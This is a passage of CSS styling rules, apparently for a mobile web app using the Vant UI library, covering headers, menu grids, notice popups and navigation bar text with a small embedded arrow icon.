		height: 60px;
		margin-top: 5px
	}

	.topItem .profit image {
		margin-right: 5px
	}

	.MyHeader {
		font-size: 19px;
		border-radius: 50%;
		background: pink;
		overflow: hidden;
		width: 72px;
		height: 72px
	}

	.MyHeader_box {
		padding: 2px;
		overflow: hidden;
		margin-left: 10px;
		flex-shrink: 0
	}

	.Menu {
		flex-wrap: nowrap
	}

	.Menu .van-grid-item__content {
		border-radius: 5px;
		color: #ccc;
		background: transparent none repeat scroll 0 0
	}

	.Menu .van-grid-item__icon-wrapper {
		margin-right: 15px;
		overflow: hidden;
		flex: 1
	}

	.Title {
		margin: 4px 0;
		padding: 7px 25px
	}

	.popupBg {
		background: #fff;
		border-radius: .8rem
	}

	.NoticePopup {
		background-size: contain;
		background-color: #fff;
		height: 450px
	}

	.NoticePopup dd {
		font-size: 13.5px;
		overflow: inherit;
		color: #666
	}

	.popup_title {
		display: flex;
		line-height: normal;
		height: 170px;
		justify-content: flex-end;
		box-sizing: border-box;
		padding: 40px 0 0 0
	}

	.popup_title div {
		display: flex;
		flex-direction: column;
		align-items: center;
		font-size: 26px
	}

	.popup_title div span:first-child {
		font-weight: 700;
		color: #4e51bf
	}

	.popup_title div span:last-child {
		color: #9b9efc;
		letter-spacing: .34rem;
		font-size: 22px
	}

	.popup_title .letter_s {
		letter-spacing: .2rem;
		font-size: 25px !important
	}

	.close image {
		width: 36px;
		margin-top: 20px
	}

	.van-popup {
		overflow: inherit
	}

	.content_footer_justify .van-cell__left-icon {
		margin-right: 0
	}

	.content_footer_justify .van-cell__left-icon image {
		width: 1.1em;
		height: 1.1em
	}

	.content_footer_justify_itemBgc {
		background: linear-gradient(180deg, #4e51bf, #ff93a4);
		padding: 3px;
		border-radius: 16px;
		margin-top: 15px
	}

	.van-grid-item {
		padding: 0 !important
	}

	.Site .van-nav-bar__text {
		color: #fff;
		font-size: 15px;
		position: relative
	}

	.van-nav-bar__text1 .van-nav-bar__text {
		letter-spacing: .09rem
	}

	.Site .van-nav-bar__text:after {
		content: "";
		position: absolute;
		background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAAg0lEQVQoka3Pyw3CMBQF0VFK4c8CKkmxKYYKyA+qGDYvErJCTMBP8u7OkYzaWO6aCrhS7i4VUAPPAtgDqFFRz+r4x1fHMJhA1NOP6BAtKTihwwqsV4/vRgoSg/4LrFMPaT8HEsNuAWvV/Vz7CSSCdg2WA1F3CXpXt0tNDiSAW7xNbv8CcsJ4aaNHrk4AAAAASUVORK5CYII=) no-repeat;
		background-size: 100% 100%;
		width: 9px;
		height: 5px;
		top: 9px;
		right: -14px
	}

	.Site .van-nav-bar__right {
		padding: 0;
		padding-right: 35px
	}

	.TaskHall_info .van-cell__left-icon image {
		width: 11px;
		height: 11px
	}

	.two image {
		width: 30px;
		height: 20px !important
	}
</style>